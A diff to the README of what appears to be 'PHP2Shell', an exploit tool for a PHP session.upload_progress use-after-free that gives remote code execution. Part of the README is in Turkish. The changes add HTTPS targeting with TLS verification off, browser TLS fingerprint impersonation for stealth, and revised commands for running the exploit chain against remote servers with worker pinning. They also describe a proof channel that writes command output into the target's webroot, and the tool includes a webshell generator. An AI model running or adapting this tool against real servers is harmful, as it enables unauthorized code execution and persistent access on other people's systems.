@@ -17,6 +17,7 @@ PHP2Shell is a PHP `session.upload_progress` stale-state use-after-free that yie
 | **CVSS** | 9.2 (Critical) |
 | **Affected** | PHP 5.4 – 8.x, fixed in 8.2.35 / 8.3.36 / 8.4.27 / 8.5.12 (2026-10-21) |
 | **Stealth** | `curl_cffi` JA3/TLS impersonation (Chrome / Safari / Firefox / Edge / Android) on every request |
+| **Transport** | HTTP and **HTTPS** targets (`--url https://…`), TLS verification off by default (self-signed/internal CAs are the norm) |
 | **Chains** | 5 — production (128M, `display_errors=Off`), 8M remote, local UAF, handler mismatch, session injection |
 | **Tests** | 74 unit tests (syntax, guards, classification, OOM signals, CLI smoke) |
 
@@ -31,7 +32,7 @@ The chain technique in `exploit/` is a port of **9bie's** public research ([gith
 ## Install
 
 ```bash
-git clone https://github.com/eagleofanadolu/php2shell-poc.git
+git clone https://github.com/murat-levi/php2shell-poc.git
 cd php2shell-poc
 bash install.sh
 # or, without the global symlink:
@@ -65,7 +66,7 @@ php2shell.py scan -l targets.txt --json out/report.json --csv out/report.csv
 php2shell.py preflight http://target/
 
 # run a chain (READY + confirmation); default chain = pure (production)
-php2shell.py exploit http://target/ --chain pure --cmd 'id>/out/p1'
+php2shell.py exploit http://target/index.php --chain pure -c id --proof-file p1.txt
 
 # generate a password-protected webshell (add-on, not an uploader)
 php2shell.py shell --out out --ttl 24
@@ -296,22 +297,25 @@ Aynı distro+versiyon konteyneri offset'leri doğrulamak için de kullanılabili
 ```bash
 # Gerçek bir uzak sunucu (yazılı izniniz varsa):
 php2shell.py exploit https://hedef.example.com/index.php \
-    --chain pure -c id --proof-file p1 --workers 150 --yes
+    --chain pure -c id --proof-file p1.txt --workers 150 --yes
 ```
 
-**Kritik üç kural (canlı doğrulandı):**
+**Kritik dört kural (canlı doğrulandı):**
 
 | Kural | Neden |
 |-------|-------|
-| `--path` gerçek bir `.php` dosyası olmalı (`/index.php`, `/wp-login.php`…), DirectoryIndex kökü (`/`) değil | Kök istek Apache'de internal redirect üretir, heap layout değişir, B1 leak bozulur |
+| Hedef gerçek bir `.php` dosyası olmalı (`/index.php`, `/wp-login.php`…), DirectoryIndex kökü (`/`) değil | Kök istek Apache'de internal redirect üretir, heap layout değişir, B1 leak bozulur |
 | Çok worker'lı hedefte `--workers <MaxRequestWorkers>` verin | Chain, workers-1 tanesini yarım isteklerle meşgul edip producer+consumer'ı kalan tek child'a sabitler (worker pinning) |
 | Hedef, dağıtımın tam `php.ini`'siyle çalışmalı (`variables_order=GPCS`, `request_order=GP`, `zend.assertions=-1`) | Request startup ayarları heap layout'u belirler; bu varsayılanlar gerçek distro PHP sunucularının değerleridir |
+| Kanıt kanalı `--proof-file` (veya `--proof-url`) olmalı | Komut çıktısı hedefin webroot'una yazılır ve HTTP ile geri okunur — `/out` yalnızca lab mount'unda vardır |
+
+**Kanıt kanalı nasıl çalışır:** `id>p1.txt` komutu PHP'nin çalışma dizinine (çoğu kurulumda webroot) yazar; araç sonra aynı web sunucusundan `http://hedef/p1.txt` isteyip çıktıyı okur. Bu, uzak bir sunucuda çalışan **tek** doğrulama yoludur — hedefte paylaşımlı bir dizin yoktur. `/out` yolu sadece `--proof-lab` ile (Docker lab'ında) kullanılır.
 
 **Doğrulanmış tam akış (production profili — stock Apache, `php.ini-production`, 150 worker):**
 
 ```
 $ php2shell.py exploit http://127.0.0.1:8089/index.php \
-      --chain pure -c id --proof-file p1 --workers 150 --yes
+      --chain pure -c id --proof-file p1.txt --workers 150 --yes
 
 URL     : http://127.0.0.1:8089/index.php
 verdict : vulnerable - PHP 8.4.26 < fix-floor 8.4.27
